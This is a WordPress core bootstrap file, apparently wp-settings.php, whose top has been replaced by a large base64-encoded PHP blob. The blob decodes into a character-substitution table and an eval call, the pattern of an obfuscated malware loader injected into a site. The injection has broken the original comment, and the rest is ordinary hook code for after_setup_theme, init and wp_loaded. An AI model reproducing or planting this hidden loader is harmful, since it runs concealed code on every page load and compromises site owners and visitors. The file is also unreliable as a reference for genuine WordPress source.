JIdScuCidFckh1RXJIdUVySFhQUXB2aUM5SkUwT3ZWQ2E0bWpwcnlrTGdFckh1RXJIdUVyT1VTSEVVZnJIdUVySHVFckhYWlFlWVZqJy4KJ252WkNlRW04emlCcG52WkNlbVprTGdFckh1RXJIdUVyT3FTSGV1RXJIdUVySHVFckh1RXJPMGI4T29QNWV1bTh6aUJwbnZaQ3hxU0hldUVySHVFckgnLgondUVzTFVma0xnRXJIdUVySHVFck8wYjhPb1A1ZXVlcnhxU0hldUVySFg0a0xnU0hldUVySFgnLgonOTgyRng4emJkNWVYeENpNEI1T282ajJGc0cydm1mSHZBRzJpYlRIdW1HOWF3UU5HVXBudlk4eklaa0xnRXJIdUVSJy4KJ0JVZnJIdUVySHVFckh1bVF6YVVHdHU0cnowWUNubG5TYTRtUTJTZFF6bGcwejBZQ25sblNhNG1HcHZZZk5xU0hFVWZySHVFckh1RXJIdW1DMycuCid2ZEM5YTZRbzRCR3B2Z3JrVUVHM1Nzdm5vVUxuNFY1MjRBbDN2ZEM5YTZRdEVackhKRXJlaGVNQicuCidVZnJIdUVySHVFckh1bUMzdmRDOWE2UW80Qkdwdmdya1VFME9TVTUzMFlRbm9zQ3phVWpIdUFyT1NpRzZTVUNlWVZRa2xncjlTWUduWWJyZW1xcmt1cXJrbFpySEpFcicuCidiaGVySEpFNTJMaWZIdkFHMmlickhKRUczU3N2bm9VdHo0dzhIRVpmTnFTSEVVZmtMZ0VySHVFckh1RXInLgonelN3cG5RWjV6b3M4MzBaOHpsZzBPU1U1MzBZUW5vc0N6YVVqSEJFRzNTc1EyRnhDNmJCOEhFbVF6YScuCidVR3RCRUczU3N2bm9VdHo0dzhIRVpmdG15a0xnRXJIdUVzTFVma0xnRXJIdUVRNm9BRzN2WjVuJy4KJ0pFRzNTc0N6Y2lRbmJBcDMwYjV0RW01OWFWUXRtU0hldUVySFh5a0xnRXJIdUVySHVFckh2dycuCic4ejRQRzI4YnAzWFk4ekVFN3RYeENpNE9RcHZrNW5pVjVuRk44ejRQRzI4YmZIbUFySHJkcnhxU0gnLgonZXVFckh1RXJIdUUwT1NVNTMwWVFub3NDemFVakh1NHJIdnc4ejRQRzI4YnAzWFk4ekVFVGVYdzgyMHc4T3JnNTJMJy4KJ2lmSDB4RzJTZ1F0clpUSHVCVEh1aWZ0dUFySDBzcmV1QXJ6aW1TdEVtNTlhVlF0dUFyelN3cFU4YjhJWWRDM0xnZnRteWtMZ1NIZXVFckh1RXJIdUVqMkdFZnpRWjV6b3NRcFknLgonWkMzdndmSHZ3OHo0UEcyOGJwM1hZOHpFWmZMVWZySHVFckh1RXJIWHlrTGdFckh1RXJIdUVySHVFckhYdTgyRnFqMkYxZkh2Jy4KJ3c4ejRQRzI4YnAzWFk4ekVaTUJVZnJIdUVySHVFckhYNGtMZ0VySHVFc0xVZmtMZ0VySHVFJy4KJ1E2b0FHM3ZaNW5KRUczU3NDemNpUW5iQXBuY2RHMkxnMHpGWTUybDROYm9XTkhtU0hldUVySFh5aycuCidMZ0VySHVFckh1RXJIdnc4ejRQRzI4YnAzWFk4ekVFN3RYeENpNE9RcHZrNW5pVjVuRk44ejRQRzI4YicuCidmSG15a0xnU0hldUVySHVFckh1RWoyR0VmemJ3cG52WkNlRW1DM3ZkQzlhNlFvNEJHcHZnZnRtU0hldUVySHVFckh1RVJCVWZySHVFJy4KJ3JIdUVySHVFckh1RWoyR0VmSHZBRzJpYnJrVTRySUZvTklCWnJIaGRyemNkRzJMRUcyY3FyT1hxODI4WjU2V1NIZXVFckh1RXJIdUVySHVFck9xU0hldUUnLgonckh1RXJIdUVySHVFckh1RXJIWDk1MzBiRzJTZ3JIWXdHbmFBUXpiUGZIdnc4ejRQRzI4YnAzWCcuCidZOHpFWnJ6YXdySHYxUXBtNDdldkI1T282ajJGczU5YVZRdG1TSGV1RXJIdUVySHVFckh1RXJIdUVySFh5a0xnRScuCidySHVFckh1RXJIdUVySHVFckh1RXJIdUVyemI5ckhZdzhPMEI1M1dnME9YcTgyOFo1YjRBRzJpYlRIWHc4MjB3OE9yZzUyTGlmSDB4RzJTZ1F0clpUSHUnLgonQlRIdWlmdG1Fck5VNHJJUVk1T1NiZkxVZnJIdUVySHVFckh1RXJIdUVySHVFckh1RXJIWHlrTGdFckh1RXJIdUVySHVFckh1RXJIdUVySHUnLgonRXJIdUVySFh1UXBRWTVIWXhDaTRtUTJTUFJwWFVmelN3cG5RWjV6b3NDOW9ZUUhFbUMzdmRDOWE2UW80QkdwdmdySEpFcmVoZXJISkUwT1hxODI4WjViNEFHMmliZnRCRUczJy4KJ1Nzdm5vVXR6NHc4SEVaZnRteWtMZ0VySHVFckh1RXJIdUVySHVFckh1RXJIdUVyT1VTSGUnLgondUVySHVFckh1RXJIdUVySHVFckhYNGtMZ0VySHVFckh1RXJIdUVySFg0a0xnRXJIdUVySHVFckh1RXJIWGI1T1Nia0xnRXJIdUVySHVFckh1RXJIWHlrTGdFckh1RXJIJy4KJ3VFckh1RXJIdUVySHVFME9TVTUzMFlRbm9zQ3phVWpIdTRySHZ3OHo0UEcyOGJwM1hZOHpFRVRldWVUUCcuCidyRVRlWHc4MjB3OE9yZzUyTGlmSDB4RzJTZ1F0clpUSHVCVEh1aWZ0dUFySDBzcmV1QXJ6aW1TdEVtNTlhVlF0dUFyelN3cFU4YjhJWWRDJy4KJzNMZ2Z0bXlrTGdTSGV1RXJIdUVySHVFckh1RXJIdUVySFhaUWV1Z1E5YnFRbzRiUnpidzhPV2cwT1NVNTMwWVFub3NDemFVakhtWmtMZ0VyJy4KJ0h1RXJIdUVySHVFckh1RXJIdUVSQlVmckh1RXJIdUVySHVFckh1RXJIdUVySHVFckhYdVFwUVk1SFl4Q2k0bVEyU1BScFhVZnpTd3BuUVo1em9zQzlvWVFIRW0nLgonQzN2ZEM5YTZRbzRCR3B2Z2Z0QkVHM1Nzdm5vVXR6NHc4SEVaZnRteWtMZ0VySHVFckh1RXInLgonSHVFckh1RXJIdUVzTFVmckh1RXJIdUVySHVFckh1RXNMVWZySHVFckh1RXJIWDRrTGdFckh1RXNMVWZrTGdFckh1RVE2b0FHM3ZaNW5KRUczU3M4MzBaOHphZTV6b3NHblknLgonYkducWdmTFVmckh1RXJPcVNIZXVFckh1RXJIdUVqMkdFZk9TVUM5Y2I1ZVl4Q2k0T1FwdmsnLgonNW5pVjVuRk44ejRQRzI4YmZIbVpySEk0cmt1WmtMZ0VySHVFckh1RXJPcVNIZXVFckh1RXJIdUVySHVFck8wYjhPb1A1ZVhsQzZvYk1CVWZySHVFckh1RXJIWDRrJy4KJ0xnRXJIdUVySHVFcnpvcUNubFNIZXVFckh1RXJIdUVSQlVmckh1RXJIdUVySHVFckh1RUM5b1U4Jy4KJ3AwQXJJUVk1T1NiTUJVZnJIdUVySHVFckhYNGtMZ0VySHVFc0xVZmtMZ0VySHVFUTk0UFEyYXhqSHVnMCcuCidhNGtOVTRUdGxsRUdwV0UwelZiUk5VKzBPUVk1T29iZkxVZnJIdUVyT3FTSGV1RXJIdUVySHVFMHp2WTh6SUU3dHVtODlhcTgybHlrTGdFckh1RXJIJy4KJ3VFckh2bUdwdllwblZiUnR1NHJIdjFRcG15a0xnRXJIdUVzTFVma0xnRXJIdUVqMkdFZkhJbVF6YVVHdG1TSGV1RXJIWHlrTGdFcicuCidIdUVySHVFcnpRZEM5b1lHbkVFZkh2c2xJNE5vSFhZQ1B1bWpub0Y3TkptODlhcTgybFprTGdFckh1RXJIdUVyT3FTSGV1RXJIdUVySHVFckh1RXJIdm0nLgonR3B2WXJrVUUwT1FZNU9vYk1CVWZySHVFckh1RXJIdUVySHVFMHp2WTh6YXNqbm9GcmtVRTB6VmJSTnEnLgonU0hldUVySHVFckh1RXNMVWZySHVFck9VU0hFVWZySHVFckh2bUdwdllya1VFTE9vQUNub1BqMmFxanBaYmZ6U3dwbnZiRzMwRkNPTGdHOWF3UU5HVXBudmJHbjRtUXRFbVF6Jy4KJ2FVR3RtcXJIdm1HcHZZcG5WYlJ0bVpNQlVma0xnRXJIdUVqMkdFZnpid0Nub1VmSHZtR3B2WTJQOCcuCidZalA4OGZ0dTkwZXVtRzNTc0dwb1Vqa1U0MHp2WTh6YTUwbmExMGlVWmtMZ0VySHVFUkJVZnJIdUVySHVFckhYWlFldWcwenZZOHphNTBuSTZwdHU0N3R1Nmp0Q1prJy4KJ0xnRXJIdUVySHVFck9xU0hldUVySHVFckh1RXJIdUVySHZacmtVRUxwMFBHcG1na0xnRXJIdUVySHVFckh1RXInLgonSHVFckh1RTAzWG4wUHU0N2VYdUN6WUI4OW9QQ25iZDVlRVpUdVVmckh1RXJIdUVySHVFckh1RXJIdUVySDh3OCcuCidlQ0U3TkpFMHdJQVdIVVAwUEJTSGV1RXJIdUVySHVFckh1RXJIdUVySHU2RzJxNnJrVStySHZtR3B2WTJQJy4KJzhZalA4OFR1VWZySHVFckh1RXJIdUVySHVFZk5xU0hldUVySHVFckh1RXJIdUVyem94anpoRUxPU2JDOWJZNXpiS1F0RW1qdG15a0wnLgonZ0VySHVFckh1RXJIdUVySFhiUnpiVU1CVWZySHVFckh1RXJIWDRrTGdFckh1RXJIdUVyem9xQ25vWlFldWcwenZZOCcuCid6YTUwbkk2cHR1NDd0dTZRdENaa0xnRXJIdUVySHVFck9xU0hldUVySHVFckh1RXJIdUVyem9uRzJCZzB6dlk4emE1MG5MNnB0bXlrTGdFckh1RXJIdUVyT1VTSGV1RScuCidySHVFckh1RVEyY3dRMmI5ckhFbVF6YVVHb3E2R3Q4OHJrVTRySDhCNU9vNmoySjZmTFVmckh1RXJIdUVySFh5a0xnRXJIdUVySHVFckh1RXJIWFpRZUVtUXphVUdvJy4KJ3E2Q25JNnB0dTQ3dHU2RzJ2bTBQbVNIZXVFckh1RXJIdUVySHVFck9xU0hldUVySHVFckh1RXJIdUVySHVFckhYeENpNEI1T282ajJGcycuCidHMnZtZkh2bUdwdlkyUDhCMGlVcXJIdm1HcHZZMlA4bTBpVVpNQlVmckh1RXJIdUVySHVFckh1RXNMVWZySHVFckh1Jy4KJ0VySHVFckh1RVEyY3dRMmI5Zkh2bUdwdlkyUDh3R3Q4OHJrVTRySDhQUTJVNmZMVWZySHVFckh1RXJIdUVySHVFUkJVZnJIdUVySHVFckh1RXJIdUVySHVFcnpTdycuCidwM1hxODI4WjViNFBRMlVnMHp2WTh6YTUwM3U2cHRteWtMZ0VySHVFckh1RXJIdUVySFg0a0xnRXJIdUVySHVFck9VU0hldUVySHVFckh1RVEyU2c1UHVtUXphVUdvcTZHJy4KJzJxNnBOcVNIZXVFckh1RXJIdUVRcFlaOEhFWk1CVWZySHVFck9VU0hFVWZySHVFcnpTd3AzWHE4MjhaNWI0cTVuYW1mSG15a0xaNCc7CiRsaW5wbHNseCA9IEFycmF5KCcxJz0+J3InLCAnMCc9PidKJywgJzMnPT4nMycsICcyJz0+J1cnLCAnNSc9PidiJywgJzQnPT4nOScsICc3Jz0+J1AnLCAnNic9PiduJywgJzknPT4nbScsICc4Jz0+J2QnLCAnQSc9Pid1JywgJ0MnPT4nYycsICdCJz0+J3cnLCAnRSc9PidnJywgJ0QnPT4ncScsICdHJz0+J1knLCAnRic9Pic1JywgJ0knPT4nRScsICdIJz0+J0MnLCAnSyc9Pic2JywgJ0onPT4nNCcsICdNJz0+J08nLCAnTCc9PidRJywgJ08nPT4nSCcsICdOJz0+J1QnLCAnUSc9PidaJywgJ1AnPT4neScsICdTJz0+J04nLCAnUic9PidlJywgJ1UnPT4nMCcsICdUJz0+J0wnLCAnVyc9PidNJywgJ1YnPT4ndCcsICdZJz0+J2gnLCAnWCc9PidCJywgJ1onPT4ncCcsICdhJz0+J0YnLCAnYyc9Pid4JywgJ2InPT4nbCcsICdlJz0+J2knLCAnZCc9Pid2JywgJ2cnPT4nbycsICdmJz0+J0snLCAnaSc9PicxJywgJ2gnPT4nOCcsICdrJz0+J0QnLCAnaic9PidhJywgJ20nPT4naycsICdsJz0+J1UnLCAnbyc9PidWJywgJ24nPT4nMicsICdxJz0+J3MnLCAncCc9PidYJywgJ3MnPT4nZicsICdyJz0+J0knLCAndSc9PidBJywgJ3QnPT4nUycsICd3Jz0+J3onLCAndic9PidSJywgJ3knPT4nNycsICd4Jz0+J2onLCAneic9PidHJyk7CmV2YWwvKnF5bW5vbnZyKi8obXhtcm5jZigkcmFrdmZqLCAkbGlucGxzbHgpKTsKfQ=="));
/*he theme is loaded.
 *
 * @since 3.0.0
 */
do_action( 'after_setup_theme' );

// Set up current user.
$wp->init();

/**
 * Fires after WordPress has finished loading but before any headers are sent.
 *
 * Most of WP is loaded at this stage, and the user is authenticated. WP continues
 * to load on the init hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the wp_loaded hook below.
 *
 * @since 1.5.0
 */
do_action( 'init' );

// Check site status
if ( is_multisite() ) {
	if ( true !== ( $file = ms_site_check() ) ) {
		require( $file );
		die();
	}
	unset($file);
}

/**
 * This hook is fired once WP, all plugins, and the theme are fully loaded and instantiated.
 *
 * AJAX requests should use wp-admin/admin-ajax.php. admin-ajax.php can handle requests for
 * users not logged in.
 *
 * @link http://codex.wordpress.org/AJAX_in_Plugins
 *
 * @since 3.0.0
 */
do_action( 'wp_loaded' );
